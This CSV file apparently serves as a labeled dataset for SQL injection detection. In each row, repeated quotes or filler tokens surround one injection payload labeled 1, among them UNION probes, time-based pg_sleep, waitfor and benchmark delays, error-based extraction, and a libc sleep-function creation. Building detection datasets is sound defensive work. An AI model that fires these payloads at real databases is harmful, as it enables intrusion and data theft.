Query,Label
"Not all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot ""-5744) union all select 3617 3617 3617 3617 3617 ""3617 all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lostNot all people who wander are lost",1
"not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to  6ht74gsghrf6qld2fb10xtpsyl7zn0ieojwcz71z7ied28sf6gy 1kjtq5sjw9ts3 x g7f62dayr1u6at 98f6 8uwgfxk1bwes9z 3qmnh36kh0ld5oo4 nn4srdfkdrmrogor8rf1p75dswfjg43p1lsput9rx8t9udu8bkfgdwxjiqj2zwdl92endu3wytzo cek7l7o93gxgo7itzeyoyoxghkiwq481'|| ( select 'aair' where 9234 = 9234 union all select null,null,null,null# not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to not just because it stands a chance to ",1
Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of 1';select pg_sleep(5) Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of Nothing can teach us better than our understanding of ,1
"Nothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasmNothing great was ever achieved without enthusiasm ""1%';create or replace function sleep(int) returns int as '/lib/libc.so.6' ""'sleep' language 'c' strict; select sleep(5) and '%'='"""" Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm Nothing great was ever achieved without enthusiasm ",1
"Nothing happens unless first we dream ""-4606"""") as elek where 8261=8261 or 8571=8571--"" Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream Nothing happens unless first we dream We need to rent a room for our partyWe need to rent a room for our party",1
Nothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing  '))) and exp(~(select * from (select concat(0x7171706a71 (select (elt(8190=8190 1))) 0x717a767a71 0x78))x)) and ((('%'=' happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dreamNothing happens unless first we dream,1
Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely 1'+(select 'qsqs' where 9227=9227 waitfor delay '0:0:5')+' Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely Nothing is a waste of time if you use the experience wisely ,1
"Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet 1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet Nothing is as cautiously cuddly as a pet ",1
"'Nothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens  ) as fgne where 7207=7207;select pg_sleep(5)--"" authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silenceNothing strengthens authority so much as silence Nothing strengthens authority so much as silence",1
Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much Nothing strengthens authority so much 1'+(select mavu where 4276=4276 rlike sleep(5)#,1
"Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do ""1"""")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""""fuus"""" like """"fuus"" Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do Nothing will work unless you do ",1
nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 ' rlike (select (case when (3596=4245) then 1 else 0x28 end)) and '%'=' nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4 nputui9w4,1
oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb oigjb '))) or make_set(9354=9354 7185) and ((('%'=',1
One must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one  '))) and 4069=8786 and ((('eftr'='eftr is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopardsOne must be fond of people and trust them if one is not to make a mess of life The beach was crowded with snow leopards,1
"Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live ""1))) or (select 2*(if((select * from (select concat(0x7171706a71 (select (elt(8113=8113 1))) 0x717a767a71 0x78))s) 8.45E+18 "" 8446744073709551610))) and (((7589=7589"""" Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to live Only when we are no longer afraid do we begin to ",1
"Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake 1)) or 8466=benchmark(5000000,md5(0x694a4745)) and ((8189=8189Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake Our greatness lies not so much in being able to remake the world as being able to remake ",1
